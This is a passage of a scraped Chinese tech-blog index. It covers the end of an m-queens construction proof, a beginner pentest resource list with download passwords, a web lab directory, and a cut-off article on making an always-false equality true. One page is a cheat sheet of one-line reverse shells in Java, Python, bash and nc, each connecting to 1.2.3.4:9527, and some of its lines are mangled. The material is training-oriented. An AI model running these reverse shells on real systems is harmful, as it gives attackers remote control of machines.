的取值范围影响，显然是不可能的，主对角编号的唯一性得证。 ③ 次对角编号的唯一性证明： 　由此可知当 n != 3λ + 1（λ = 0, 1, 2, ...）时，次对角编号是唯一的。 　综上①②③，定理A得证 。 4.3.2. 【构造式B】的证明 4.3.2.1. 【构造式B】 令 m = 2n，其中 n = 2, 3, 4, ...（即 m ≥ 4 且是偶数）： 为了便于说明，对 PB-1 和 PB-2 的对m取mod运算做一下等价处理： 构造式含义：若把棋盘在横中轴线切开，很明显解集是呈中心旋转对称的，其中上半部分对应 PB-1 的解集，下半部分对应 PB-2 的解集。同时根据列编号 mod m 部分的取值（ ≥m 或 ），PB-1 与 PB-2 的解集又分别拆分成两个分段函数子集： 4.3.2.2. 【定理B】 [!TIP|style:flat|label:定理B] 对于m皇后问题，当 n != 3λ （其中 λ = 1, 2, 3, ... ）时，则必定可以使用【构造式B】求解。 4.3.2.3. 【定理B】的证明 ① 行列编号的唯一性证明： 　明显地： 当n是偶数时，PB-1 的每个皇后放置在前n行的每个偶数列，PA-2 的每个皇后放置在后n行的每个奇数列； 当n是奇数时，PB-1 的每个皇后放置在前n行的每个奇数列，PA-2 的每个皇后放置在后n行的每个偶数列。 亦即不论n的奇偶性如何，每行每列均有且只有一个皇后，行列编号的唯一性得证。 ② 主对角编号的唯一性证明： 化简（1）得 k+l = 4n-2，但因为 MIN(k+l) = 2，此时 n = 1，与前提条件 m=2n≥4 ⇒ n≥2 矛盾，因此（1）不成立。 化简（4）得 k'+l' = 2n+4，与 MAX(k'+l') = 2n 矛盾，因此（4）不成立。 化简（5）得 k+k' = 2n 从取值范围看显然不成立。 化简（6）得 l'-l = 2n 从取值范围看显然不成立。 化简（2）得 k+l' = 4，化简（3）得 k'+l = 4， 由于 k 与 l 的取值范围相同， k' 与 l' 的取值范围相同，因此有： 　而 n = 3 不在定理B的前提条件 n != 3λ（λ = 1, 2, 3, ...）范围内，可以直接排除。 　因此 n > 3（否则 k' 与 l' 不能存在），所以不存在 n = 2 或 n = 3 取值的可能性，亦即（2）（3）实际均不成立。 　综上，（1）（2）（3）（4）（5）（6）均不成立，主对角编号的唯一性得证。 ③ 次对角编号的唯一性证明： 化简（1）得 2n = 3(k+l-2)，因此 k+l-2 必为偶数，令 2λ = k+l-2（λ = 1, 2, 3, ...），则有 2n=3(2λ) ⇒ n=3λ，即当且仅当 n = 3λ 时（1）成立。 化简（2）得 4n = 3(k+l'-2)，因此 k+l'-2 必为二重偶数（即至少能被2整除两次），令 4λ = k+l'-2（λ = 1, 2, 3, ...），则有 4n=3(4λ) ⇒ n=3λ，即当且仅当 n = 3λ 时（2）成立。 化简（3）得 4n = 3(k'+l-2)，因此 k'+l-2 必为二重偶数（即至少能被2整除两次），令 4λ = k'+l-2（λ = 1, 2, 3, ...），则有 4n=3(4λ) ⇒ n=3λ，即当且仅当 n = 3λ 时（3）成立。 化简（4）得 2n = k'+l'-2，但从 k' 与 l' 的取值范围可知 MAX(k'+l'-2) = n+n-2 = 2n-2，亦即 2n > k'+l'-2，因此（4）不成立。 化简（5）得 2n = 3(k'-k)，因此 k'-k 必为偶数，令 2λ = k'-k（λ = 1, 2, 3, ...），则有 2n=3(2λ) ⇒ n=3λ，即当且仅当 n = 3λ 时（5）成立。 化简（6）得 2n = 3(l'-l)，因此 l'-l 必为偶数，令 2λ = l'-l（λ = 1, 2, 3, ...），则有 2n=3(2λ) ⇒ n=3λ，即当且仅当 n = 3λ 时（6）成立。 　由此可知，当 n != 3λ（λ = 1, 2, 3, ...）时，（1）（2）（3）（4）（5）（6）均不成立，次对角编号的唯一性得证。 　综上①②③，定理B得证 。 4.3.3. 【构造式C】的证明 4.3.3.1. 两条【引理】 我们定义棋盘上由方格 (1, 1)、 (2, 2)、 (3, 3)、 ...、 (m, m) 连线所得的对角线为标准对角线，亦即标准对角线的行列编号必有 i == j 。 在证明构造式C之前，首先需要证明两条引理： 【引理A】 使用构造式A得到的解，没有任何皇后的坐标是在标准对角线上的。 【引理B】 使用构造式B得到的解，没有任何皇后的坐标是在标准对角线上的。 ① 【引理A】的证明： 　k = 0 与取值范围 k = 1, 2, 3, ..., n 矛盾，l = 0 与取值范围 l = 1, 2, 3, ..., n 矛盾，因此假设不成立，【引理A】得证。 ② 【引理B】的证明： 　由于 2n=m≥4 ⇒ n≥2，因此（1）（3）不成立，否则 k,l ≤ 0，与取值范围矛盾。 　又由于（2）（4）的取值范围 k,l ≤ n，（2）（4）明显不成立。 　因此假设不成立，【引理B】得证。 4.3.3.2. 【定理C】 [!TIP|style:flat|label:定理C] 对于可使用【构造式A】或【构造式B】求解的m皇后问题，若同时增加第 m+1 行和第 m+1 列，使其延展为 m+1 皇后问题，那么这个 m+1 皇后问题也是可解的，且第 m+1 个皇后应放置在坐标为 (m+1, m+1) 的方格。 4.3.3.3. 【定理C】的证明 ① 行列编号的唯一性证明： 　由于【定理C】是从【定理A】或【定理B】上扩展的，且【定理A】与【定理B】的所有皇后的行列编号唯一性已得到证明，而【定理C】的第 m+1 行与第 m+1 列是新增的，那么第 m+1 个皇后的行列编号也必定是唯一的，因此所有皇后的行列编号必定也是唯一的。 ② 主对角编号的唯一性证明： 　由于第 m+1 个皇后的主对角线与标准对角线是重合的，而通过【引理A】与【引理B】可知在m×m范围内的标准对角线上不存在任何皇后，换言之标准对角线上只有第 m+1 个皇后，所以主对角线编号是唯一的。 ③ 次对角编号的唯一性证明： 　对于第 m+1 条次对角线，上面只有 (m+1, m+1) 一个方格，显然次对角线编号是唯一的。 4.4. 大前提条件m≥4的证明 上述所有的证明，都是基于一开始给出的大前提条件： 对于构造式A或B：令 m = 2n，其中 n = 2, 3, 4, ...（即 m≥4 且 m是偶数） 对于构造式C：在构造式A或B可解的基础上令 m+1（即 m≥5 且 m是奇数） 亦即m皇后问题（ m≥4 且 m是偶数）可通过【构造式A】或【构造式B】求解，而 m+1 皇后问题（ m+1≥5 且 m是奇数）则可通过【构造式C】求解。 至于为什么 m=1、 m=2 或 m=3 时并不适用于构造式A、B、C就是这里要讨论的。 首先当 m=1 时，虽然是有明确的唯一解，但并不存在 m=2n 的形式。而n作为三个构造式的重要变量，既然一开始就不存在n值，构造式A、B、C也就无从谈起了。 　那么需要证明的，就是为什么 m=2 与 m=3 也不可取？ 　证明： 　　不难发现，（2）中 m=2 是在 m。 　　但当 m=2 时 n=1，不妨把 n=1 代入 PB-1 与 PB-2，取值范围均矛盾，无法计算列坐标编号。 　　因此对于【定理A】与【定理B】而言，m=2 都是不可解的，从而导致 m=3 也不可用【定理C】求解。 　证毕（事实上，通过画图可以明显发现 m=2、 m=3 是无解的）。 5. 译者后记：通解转换式（编程用） 在原作者提出的三个构造式A、B、C中，均使用 (i, j) 的二维坐标形式标记每个皇后的位置，从数学角度上更易于表达作者的思想，但是不便于编程使用。 为此译者在这里补充针对构造式A、B、C的转换公式，使用一维坐标形式标记每个皇后位置，以配合编程使用（其实这就是目前网上普遍流传的m皇后问题构造式）。 　一维坐标的标记方式为：从第1行开始，依次写出m个数字，分别代表每行的皇后列坐标。亦即行坐标为数序（索引/下标），列坐标为数值。 　如序列 [5, 3, 1, 6, 8, 2, 4, 7] 等价于 (1,5), (2,3), (3,1), (4,6), (5,8), (6,2), (7,4), (8,7) 5.1. 【构造式A】的转换式 　约束条件：n != 3λ + 1（其中λ = 0, 1, 2, ...） 即：m != 2(3λ+1) ⇒ (m mod 6) != 2（m为偶数） 且：m-1 != 6λ+2 ⇒ (m mod 6) != 3（m为奇数，此时适用于构造式C） 　当m为偶数时： 把行编号 1~n 代入 PA-1，可得到第 1~n 行的解序列： [2, 4, 6, 8, ..., m] 把行编号 n+1~2n 代入 PA-2，可得到第 n+1~m 行的解序列： [1, 3, 5, 7, ..., m-1] 合并两个解序列，就是构造式A的通解转换式（A1）： 　　[2, 4, 6, 8, ..., m], [1, 3, 5, 7, ..., m-1] ………………………………………………………（A1） 　当m为奇数时： 把行编号 1~m-1 代入（A1），可得到第 1~m-1 行的解序列： [2, 4, 6, 8, ..., m-1], [1, 3, 5, 7, ..., m-2] 然后直接套用构造式C（增加第m行第m列），则可得到通解转换式（A2）： 　　[2, 4, 6, 8, ..., m-1], [1, 3, 5, 7, ..., m-2], [m] ………………………………………………（A2） 5.2. 【构造式B】的转换式 　约束条件：不满足构造式A约束条件的，都可使用构造式B求解。 即：m mod 6 = 2 （m为偶数） 或：m mod 6 = 3（m为奇数，此时适用于构造式C） 　当m为偶数时, n=m/2： 　　若n为偶数： 把行编号 1~n 代入 PB-1，可得到第1~n 行的解序列（注：PB-1是分段函数）： [n, n+2, ..., m], [2, 4, 6, ..., n-2] 把行编号 n+1~2n 代入 PB-2，可得到第 n+1~m 行的解序列（注：PB-2是分段函数）： [n+3, n+5, ..., m-1], [1, 3, 5, ..., n+1] 合并两个解序列，就是构造式B的通解转换式（B1）： 　　[n,n+2,...,m], [2,4,6,...,n-2], [n+3,n+5,...,m-1], [1,3,5,...,n+1] ………………………………………（B1） 　　若n为奇数： 把行编号 1~n 代入 PB-1，可得到第 1~n 行的解序列（注：PB-1是分段函数）： [n, n+2, ..., m-1], [1, 3, 5, ..., n-2] 把行编号 n+1~2n 代入 PB-2，可得到第 n+1~m 行的解序列（注：PB-2是分段函数）： [n+3, n+5, ..., m], [2, 4, 6, ..., n+1] 合并两个解序列，就是构造式B的通解转换式（B2）： 　　[n, n+2, ..., m-1], [1, 3, 5, ..., n-2], [n+3, n+5, ..., m], [2, 4, 6, ..., n+1] ………………………（B2） 　当m为奇数时, n=(m-1)/2： 　　若n为偶数： 把行编号 1~m-1 代入（B1），可得到第 1~m-1 行的解序列： [n, n+2, ..., m-1], [2, 4, 6, ..., n-2], [n+3, n+5, ..., m-2], [1, 3, 5, ..., n+1] 然后直接套用构造式C（增加第m行第m列），则可得到通解转换式（B3）： 　　[n, n+2, ..., m-1], [2, 4, 6, ..., n-2], [n+3, n+5, ..., m-2], [1, 3, 5, ..., n+1], [m] ………………（B3） 　　若n为奇数： 把行编号 1~m-1 代入（B2），可得到第 1~m-1 行的解序列： [n, n+2, ..., m-2], [1, 3, 5, ..., n-2], [n+3, n+5, ..., m-1], [2, 4, 6, ..., n+1] 把行编号1然后直接套用构造式C（增加第m行第m列），则可得到通解转换式（B4）： 　　[n, n+2, ..., m-2], [1, 3, 5, ..., n-2], [n+3, n+5, ..., m-1], [2, 4, 6, ..., n+1], [m] ………………（B4） 5.3. 小结：通解转换式归整 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/safe/":{"url":"markdown/technical/safe/","title":"安全","keywords":"","body":"安全安全 渗透测试 CTF 解题报告 威胁情报播报 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 04:55:50 "},"markdown/technical/safe/pentest/":{"url":"markdown/technical/safe/pentest/","title":"渗透测试","keywords":"","body":"渗透测试渗透测试 白帽子渗透测试入门资源：参考书、课程、工具、认证 各种语言一句话反弹 shell WEB 渗透靶场整合 如何令永假式成真 Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/safe/pentest/白帽子渗透测试入门资源.html":{"url":"markdown/technical/safe/pentest/白帽子渗透测试入门资源.html","title":"白帽子渗透测试入门资源","keywords":"","body":"白帽子渗透测试入门资源：参考书、课程、工具、认证前言名词解析Pwk课程与OSCP证书CTF工具参考书相关文献推荐资源下载白帽子渗透测试入门资源：参考书、课程、工具、认证 前言 初入渗透测试领域，过程中遇到不少错综复杂的知识，也遇到不少坑，特此记录，慢慢整理慢慢填。 名词解析 名词 全称 解析 PwK Penetration Testing with Kali Linux Kali-Linux 渗透测试培训课程 OSCP Offensive Security Certified Professional 攻防安全专家认证 OWASP Open Web Application Security Project 开放式Web应用程序安全项目它提供有关计算机和互联网应用程序的公正、实际、有成本效益的信息，如《2017 Top 10 应用风险评估报告》其目的是协助个人、企业和机构来发现和使用可信赖软件 SCAP Security Content Automation Protocol 安全内容自动化协议已成立了SCAP中文社区，集成了协议框架中的CVE、CCE、CPE、CWE、CVSS、OVAL等6种网络安全相关标准数据库 CVE Common Vulnerabilities and Exposures 公共漏洞与暴露每个CVE都有唯一编号，是一个漏洞字典表 EXP Exploit 安全术语，指可利用点（如漏洞、代码等） vul Vulnerabilities 安全术语，泛指漏洞 PoC Proof of Concept 漏洞的概念证明，常见是一段可复盘漏洞的代码 payload - 安全术语，有效载荷，泛指漏洞利用成功后所要做的事情（如Cracker会做一些有害的或者恶性的动作） shellcode - 安全术语，payload的一种，让攻击者获得 shell（由于其建立正向/反向shell而得名） WAF Web Application Firewall Web应用防护系统（也称为：网站应用级入侵防御系统） Fuzz Fuzz testing 模糊测试，一种安全测试方法它介于完全的手工测试和完全的自动化测试之间而手工测试是指渗透测试，即模拟Cracker进入系统查找漏洞 社工 社会工程学攻击 安全术语，泛指通过心理战术，欺诈他人以收集信息、行骗和入侵计算机系统的行为 XSS Cross Site Scripting 跨站脚本攻击（缩写首字母为X是为了不与CSS混淆）根据攻击特点分为：反射型XSS、存储型XSS、DOM-XSS DoS Denial of Service 拒绝服务攻击 DDoS Distributed Denial of Service 分布式拒绝服务攻击 SQLi SQL Inject SQL注入式攻击 CSRF Cross-site request forgery 跨站请求伪造攻击 CORS Cross-Origin Resource Sharing 跨源资源共享 GDPR General Data Protection Regulation 通用数据保护条例，在2018-5-25由欧盟正式出台该条例的适用范围极为广泛，任何收集、传输、保留或处理涉及到欧盟所有成员国内的个人信息的机构组织均受该条例的约束，号称史上最严个人数据保护条例 想象自己是一个特工，你的目标是监控一个重要的人，有一天你怀疑目标家里的窗子可能没有关，于是你上前推了推，结果推开了，这是一个 PoC，于是你回去了，开始准备第二天的渗透计划，第二天你通过同样的漏洞渗透进了他家，仔细查看了所有的重要文件，离开时还安装了一个隐蔽的窃听器，这一天你所做的就是一个 Exp，你在他家所做的行为就是不同的 Payload，就把窃听器当作 Shellcode 吧！ Pwk课程与OSCP证书 OSCP认证：是一个专门针对 PwK课程 的国际安全专业认证。该认证机构声称，OSCP认证是一个区别于所有其它认证的考试，考试全程采取手动操作实战的方式，而不设笔试环节。这是在安全领域含金量非常高的国际认证。 认证条件：无 考试模式：OSCP的认证考试也是另类的存在，考生拥有24小时的时间（实际是23小时45分钟）去完成考试，具体如何分配时间由考生自己决定。题目是5台主机（随机抽取），目标是攻入并拿到最高权限（ROOT/SYSTEM）。基于难度级别，成功执行的攻击会获得相应的积分。24小时结束之后，你还有24小时去完成并提交考试报告（需要详细说明攻击步骤和里程碑截屏来证明确实攻破并获得相应权限）。 考试费用：最低 $ 800 （30天实验室访问学习 + 考试认证） 相关链接： OSCP概述 PwK培训材料 CTF Capture The Flag，夺旗赛。 通过在线靶场进行实战，磨炼网络安全技巧的一种竞技。这里推荐几个免费的 CTF 站点： Root Me CG-CTF Vulhub 不建议找答案，勇敢地刷题吧！ 可以很好地锻炼发掘EXP的能（nao）力（dong）~ 工具 工具 简介 下载 Kali-Linux 渗透测试的必备工具包Kali是一个基于 Debian 的 Linux 发行版，专门用于渗透测试的工具系统大多数做安全测试的渗透和审计开源工具都被尽可能多地囊括在内 官网 CVEList CVE字典表 Github SecLists OWASP维护的一个安全信息列表集合该集合包括了用于渗透的各种类型的列表，这些列表包含了237个字典文件以及常用的 Web Shell 攻击载荷，字典文件类型众多，如用户名、密码、域名、敏感数据特征码、模糊测试载荷等 Github Exploit Database 可利用漏洞数据库（在线）罗列了最新被发现的CVE和PoC等信息，可用于学习漏洞原理和复盘 官网 SearchSploit 与 Exploit Database 配套的命令行工具包（已集成到Kali）它把Exploit Database的数据保存在本地机器（攻击方），通过搜集目标机器（防御方）的信息，在本地发现这些信息的EXP，然后在本地机器提取对应的PoC上传到目标机器实现渗透 官网 Hydra 弱密码爆破工具（已集成到Kali） Github Burp Suite 用于攻击web 应用程序的集成平台（谁用谁知道） 官网破解版密：gsqygf Arachni 基于Ruby的Web漏洞扫描工具算不上强大但有其特色，用于评估web应用程序的安全性不仅能对基本的静态或CMS网站进行扫描，还能识别大部分平台的指纹信息（硬盘序列号和网卡物理地址） 官网Github XSStrike 基于python的XSS漏洞扫描和利用工具它对参数进行模糊测试之后构建合适的payload，然后对参数进行穷举匹配，大多数payload都是由作者精心构造。其内置爬虫功能，能够检测并尝试绕过WAF，且误报率极低 Github XssPy 基于python的Web应用XSS漏洞智能扫描器它不仅能检查主页或给定页面，还能够检查网站上的所有链接以及子域微软、斯坦福、摩托罗拉、Informatica等很多大型企业机构都在用 Github Wfuzz Web Fuzzer：Web应用程序评估审查工具它可以对任何字段的HTTP请求中的数据进行模糊处理 Github OpenSCAP 基于C/C++实现的SCAP协议开源框架目的是为SCAP各个标准协议的使用者提供一套简单易用的接口 官网中文社区Github Hackvertor 黑客工具包看看黑客们平时都在用什么工具 官网 SSL/TLS安全评估报告 检查HTTPS网站的SSL证书安全性 在线检查 SecurityHeaders 通过分析HTTP响应头，评估相关安全选项是否配置得当可根据评估建议修改配置 在线检查 URL Fuzzer 扫描Web服务器上的隐藏文件/目录是否存在敏感信息 在线检查 MD5Online MD5解密：通过已知的Hash字典逆向爆破（论MD5加salt的重要性） 在线使用 truffleHog 排查 Git 项目中是否包含可疑的敏感信息 Github BFG Repo-Cleaner 移除 Git 库中的大文件或污点提交 官网Github brakeman 通过静态代码扫描发现代码里的SQL注入问题 Github gixy Nginx 配置文件静态分析器防止安全配置错误，并自动进行缺陷检测 Github bleach HTML净化器对HTML片段进行标签或属性过滤，预防XSS攻击 GithubPython版PHP版 New PHP Snippet PHP在线运行环境 在线使用 RequestBin 临时 HTTP 服务器，用于收集 HTTP 请求，XSS 利器 在线使用 参考书 参考书（Kali系列） 简介/版本 下载 Penetration Testing with Kali Linux (pwk.1.0) Kali-Linux渗透测试学习指南PwK官方文档v1.0.1 - 2014版 腾讯微云密码：4vi4bw Instant Kali Linux 2013Kali快速入门指导 腾讯微云密码：ryxi47 Basic Security Testing with Kali Linux 2014基于Kali的安全测试 腾讯微云密码：qw9ym8 Hacking with Kali - Practical Penetration Testing Techniques 2014渗透测试实践技术 腾讯微云密码：xk8a3z Kali Linux Cookbook 2013Kali指导手册 腾讯微云密码：xhgjcd Kali Linux Social Engineering 2013基于Kali的社会工程 腾讯微云密码：gs4xay Kali Linux：Assuring Security By Penetration Testing 2014通过渗透测试确保安全 腾讯微云密码：6nrp2k Web Penetration Testing with Kali Linux 2013web应用渗透测试 腾讯微云密码：2cxp9c 参考书（Metasploit系列） 简介/版本 下载 Metasploit渗透测试魔鬼训练营 2013.国内中文原创详细讲解了Metasploit渗透测试的技术、方法和技巧，并提供实战的实验室环境 腾讯微云密码：i9ihtu Metasploit The Penetration Tester's Guide 2011渗透测试入门指导 腾讯微云密码：6gurxk Metasploit Penetration Testing Cookbook Jun.2012渗透测试指导手册 腾讯微云密码：r4q73x 参考书（BackTrack5系列） 简介/版本 下载 Offensive Security - Penetration Testing with BackTrack (Lab Guide) v3.2渗透测试实验室指导手册 腾讯微云密码：fj9sqt BackTrack 5 Wireless Penetration Testing Beginner's Guide 无线网络渗透测试入门指导 腾讯微云密码：pdeqfn 参考书（其他） 简介/版本 下载 影响力（中文版） 社会工程学人为什么犯贱？ 腾讯微云密码：ssyf25 欺骗的艺术（中文版） 社会工程学世界著名黑客传奇 腾讯微云密码：wtpih9 Learning Nessus for Penetration Testing Jan.2014基于Nessus的渗透测试 腾讯微云密码：dak9um PP.Penetration Testing with the Bash shell May.2014基于Bash的渗透测试 腾讯微云密码：7saehu The Basics of Hacking and Penetration Testing( Ethical Hacking and Penetration Testing Made Easy ) 2011渗透测试的基本理论 腾讯微云密码：z9enyr The Basics of Hacking and Penetration Testing( Ethical Hacking and Penetration Testing Made Easy ) The 2nd Edition, 2013渗透测试的基本理论 腾讯微云密码：5nwjt3 Advanced Penetration Testing For Highly-Secured Environments The Ultimate Security Guide 2012终极指南：高安全环境的渗透测试 腾讯微云密码：3u3c9t Gray Hat Hacking The 2nd Edition灰帽子黑客 腾讯微云密码：4tvjgb Hacking - Firewalls And Networks How To Hack Into Remote Computers 防火墙突破：远程网络渗透 腾讯微云密码：k93xfx Hacking The Art Of Exploitation The 2nd Edition, 2018漏洞利用的艺术 腾讯微云密码：5c5ee6 Hacking Wireless Networks For Dummies 2005无线网络窃听 腾讯微云密码：px7hgj Penetration Testing A Hands-On Introduction to Hacking 2014渗透测试实践指导 腾讯微云密码：996jfr Practical Hacking - Techniques and Countermeasures 黑客实践的技术与对策 腾讯微云密码：ne75b9 相关文献推荐 社会工程： 信息安全之社会工程学（需翻墙）：常识扫盲、信息收集、假冒身份、施加影响 《影响力》——人为什么犯贱 有哪些「社会工程学」攻击手段？ 防范社会工程学攻击的技巧与姿势 场景案例： Penetration Testing with Kali (PWK) 课程和 Offensive Security Certified Professional (OSCP) 考试回顾 XSS实战：我是如何拿下你的百度账号 如何构建自己的渗透测试环境 驱散前端安全梦魇——DOMXSS典型场景分析与修复指南 CSRF 攻击的应对之道 DDOS 攻击的防范教程 海量日志中，如何实时在线检测未知异常行为？看瀚思的序列异常算法 记一次在实战靶机中使用SearchSploit的总结 Paypal 2FA Bypass（通过删掉HTTP请求参数绕过验证） 部分利用社工技巧的群发邮件样本关联分析 主机入侵： 主机威胁入侵检测开源工具与规则 OSSEC主要功能及原理+详细配置+日志文件分析 集中式日志系统 ELK 协议栈详解 浅谈大型网络入侵检测建设 Linux提权： A GUIDE TO LINUX PRIVILEGE ESCALATION Linux提权基础介绍（是前一篇的译文） Basic Linux Privilege Escalation 史上最全Linux提权后获取敏感信息方法（是前一篇的译文） 初识linux提权 渗透测试中的Linux提权 Linux提权？这四个脚本可以帮助你 Linux提权：从入门到放弃 Windows提权： Windows Privilege Escalation Fundamentals Windows下的渗透测试之提权的基本套路[上][下]（是前一篇的译文） Windows提权笔记 Privilege Escalation Windows Windows 提权命令指南 Windows提权的几种姿势 内网渗透之如何玩转Meterpreter？ Windows内核漏洞利用提权教程 Metasploit、Powershell之AlwaysInstallElevated提权实战 metasploit 渗透测试笔记(meterpreter篇) WebShell： webshell原理 bash反弹shell原理解析 基于机器学习的web异常检测 机器学习入门之像使用Print一样使用算法检测WebShell OSSEC与webshell实时监控探索 HTTP相关： HTTP cookies HTTP 安全最佳实践 跟着 Github 学习 Restful HTTP API 设计 其他： 米斯特白帽培训讲义 知道创宇研发技能表v3.1 大学霸 Kali Linux 安全渗透教程 大数据安全分析漫谈 浅析ReDoS的原理与实践 最好用的开源Web漏扫工具梳理 How to completely remove a file from a Git repository 渗透测试常用工具集合 资源下载 腾讯微云（密码：mpgksn） Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/safe/pentest/各种语言一句话反弹shell.html":{"url":"markdown/technical/safe/pentest/各种语言一句话反弹shell.html","title":"各种语言一句话反弹 shell","keywords":"","body":"各种语言的一句话反弹shell命令被攻击主机先监听端口攻击主机连接到服务端口JAVAPythonbashnc各种语言的一句话反弹shell命令 被攻击主机先监听端口 这是大前提，至于怎么做就看 hacker 的能力了，最简单脚本可以用 nc ： nc -lvvp 9527 攻击主机连接到服务端口 JAVA Runtime.getRuntime().exec([\"/bin/bash\",\"-c\",\"exec 5<>/dev/tcp/1.2.3.4/9527;cat &5 >&5; done\"] as String[]); Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"1.2.3.4\",9527));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' bash bash -i >& /dev/tcp/1.2.3.4/9527 0>&1 nc nc -e /bin/sh 1.2.3.4 9527 或 mknod /tmp/backpipe p /bin/sh 0/tmp/backpipe Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/safe/pentest/web渗透靶场整合.html":{"url":"markdown/technical/safe/pentest/web渗透靶场整合.html","title":"WEB 渗透靶场整合","keywords":"","body":"web渗透靶场整合DVWA网络安全实验室sqli-labsupload-labsxss challenges必火网络安全-必火靶机三OWASP Broken Web Applications ProjectVulHubvulnhubwebug4.0vulnstackweb渗透靶场整合 DVWA 推荐新手首选靶场，配置简单，需下载 phpstudy 和靶场文件包，简单部署之后即可访问。 包含了常见的web漏洞（php的），每个漏洞分为四个等级，每个等级都有源码查看，最高等级的源码是最安全的。 DVWA靶场源码下载：http://www.dvwa.co.uk/index.php phpstudy官方下载：https://m.xp.cn/ 网络安全实验室 做题的靶场，也是一个基础靶场，是一个在线的靶场。 地址：http://hackinglab.cn/ sqli-labs sqli-labs 包含了大多数的 sql 注入类型，以一种闯关模式，对于 sql 注入进行漏洞利用。 sql 注入练习首选，同样需要 phpstudy （或者 amp 环境）加靶场源码包部署。 sqli-labs 靶场源码下载：https://github.com/Audi-1/sqli-labs upload-labs upload-labs 包含了大多数文件上传类型，一个包含几乎所有类型上传漏洞的靶场。 目前更新到 20 关。 靶场源码下载地址：https://github.com/c0ny1/upload-labs xss challenges xsschallenges 是一个专对于 XSS 漏洞练习的的靶场，包含了各种绕过，各种姿势的 XSS 利用。 在线靶场地址：http://xss-quiz.int21h.jp/ 必火网络安全-必火靶机三 这个在线靶场涵盖了大多数的 Web 漏洞，跟 DVWA 的机制差不多，还有 CTF 题可做，个人认为是一个比较全的一个 Web 漏洞靶场。 在线靶场地址：https://www.bihuoedu.com/ OWASP Broken Web Applications Project 靶场由 OWASP 专门为 Web 安全研究者和初学者开发的一个靶场，包含了大量存在已知安全漏洞的训练实验环境和真实 Web 应用程序。 靶场在官网下载后是一个集成虚拟机，可以直接在 vm 中打开，物理机访问 ip 即可访问到 web 平台，使用 root/owaspbwa 登入就会返回靶场地址，直接可以访问靶场。 DVWA 适合了解漏洞和简单的漏洞利用，owaspbwa 则就更贴近实际的复杂的业务环境。 靶场虚拟机下载地址：https://sourceforge.net/projects/owaspbwa/ VulHub 这是一个开源的漏洞环境项目，包含了很多不同的环境，是继 owaspbwa 以后，漏洞种类多，环境丰富的一个靶场，并且收集的漏洞也比较新，适合作为一个长期的学习、实战靶场。 Vulhub 是一个基于 docker 和 docker-compose 的漏洞环境集合，需要在 linux 下安装 docker，有 docker 环境之后，即可一条语句启动一个漏洞环境。 vulhub 指导安装地址：https://vulhub.org/ vulnhub Vulnhub 是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用 VMware 或者 VirtualBox 运行。 每个镜像会有破解的目标，大多是 Boot2root，从启动虚机到获取操作系统的 root 权限和查看 flag。 相比于 vulhub，这是采用的虚拟机镜像，前者是采用 docker。 靶场地址：https://www.vulnhub.com webug4.0 基础环境是基于 PHP/mysql 制作搭建而成，中级环境与高级环境分别都是由互联网漏洞事件而收集的漏洞存在的操作环境。 部分漏洞是基于 Windows 操作系统的漏洞所以将 WeBug 的 Web 环境都装在了一个纯净版的 Windows 虚拟机中。 虚拟机下载地址：https://pan.baidu.com/s/128ftyRIdCibJu6FJfEKltg 提取码: 5er7 vulnstack 红蓝对抗，内网、域渗透最新靶场： 地址：http://vulnstack.qiyuanxuetang.net/vuln/ Copyright © EXP 2020 all right reserved，powered by Gitbook最后修改时间 ： 2020-08-16 01:51:12 "},"markdown/technical/safe/pentest/如何令永假式成真.html":{"url":"markdown/technical/safe/pentest/如何令永假式成真.html","title":"如何令永假式成真","keywords":"","body":"如何令永假式成真？C++PythonRubyJavaScriptJava幕间如何令永假式成真？ 最近在 Stack Overflow 无意中发现一个挺有意思的问题： [warning] 是否可以令永假式 a == 1 && a == 2 && a == 3 的值为 true ？ C++ 当时看到题干，条件反射就想到了可以通过 C++ 实现，因为 C++ 是可以重写运算符的，其实现代码如下： #include using namespace std; class NumOP { private: int num; public: NumOP(int num) { this->num = num; } bool operator==(const int& num) { return this->num 因为闲得慌，又萌生出了一个念头：其他语言是否也都可以实现这个表达式呢？ 其实仔细分分析一下题干，要使得表达式成真，可以从两个思路切入： (1) 要么 == 的判定逻辑被篡改 (2) 要么 a 的值要在判断过程中自动变化，此时 a 不可能是基础数据类型（可能是对象、是函数、或是引用） Python 因为 Python 和 C++ 同样支持运算符重写，于是类似地可以得到 Python 的实现代码： class NumOP : def __init__(self, num) : self.num = num def __eq__(self, num) : return self.num Ruby 而对于 ruby 则可以利用它的一个语法糖简单实现：调用函数函数时，其参数列表可以不写括号。 那么只需要定义一个无入参的函数 a ，根据条件动态控制函数 a 的返回值即可，其实现代码如下： def a $i ||= 0 # $i 是全局变量 $i += 1 end if (a == 1 && a == 2 && a == 3) puts \"impossable!\" else puts \"It's right.\" end JavaScript 对于 JavaScript ，可以利用运算符 == 的松散相等特性：当 == 两边操作数的类型不相同时， JS 引擎会尝试把其中一个操作数类型转换成另一个操作数类型。 在这题里面，若左侧操作数 a 是对象，右侧是数字，则会隐式调用对象 a 的 valueOf 方法将其转换成数字；若转换失败则调用 toString 方法后再将其转换成数字。 显然，只需要控制 valueOf 逻辑使其满足每次 == 的判定即可，其实现代码如下： 注：此方法对于严格相等运算符 === 不起作用。 var a = { i: 1, valueOf: function() { return this.i++; } } if (a == 1 && a == 2 && a == 3) { console.log(\"impossable!\") } else { console.log(\"It's right.\") } Java 这么多语言中，最麻烦的就是 Java 了。主要是 Java 不允许重写运算符，只能利用 a 做文章。 但 Java 要求 == 两边类型一致，而右侧的 1/2/3 是 int 基础类型，因此 a 会受到 Java 的 编译语法 约束，只可能是 int 基础类型或其包装类 Integer。而结合本题来看，a 只可能是 Integer 对象。 根据 Java 的语言特性，Integer == int 在比对之前，会自动拆包使得两边的类型一致，事实上会变成 